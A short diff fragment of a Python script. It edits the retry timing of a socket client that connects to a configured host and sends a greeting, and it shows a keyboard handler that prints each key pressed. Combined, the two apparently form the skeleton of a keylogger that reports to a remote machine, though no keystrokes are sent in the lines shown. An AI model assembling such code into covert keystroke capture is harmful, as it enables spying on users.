@@ -26,10 +26,11 @@ def restart():
             client.connect((HOST, PORT))
             print("Connected!")
             client.sendall(b"hello")   # <-- IMPORTANT
+            time.sleep(2)
             break
         except Exception as e:
             print("Retrying:", e)
-            time.sleep(1)  # <-- CRITICAL
+            time.sleep(1)
 def on_press(key):
     try:
         print(f'Key pressed: {key.char}')
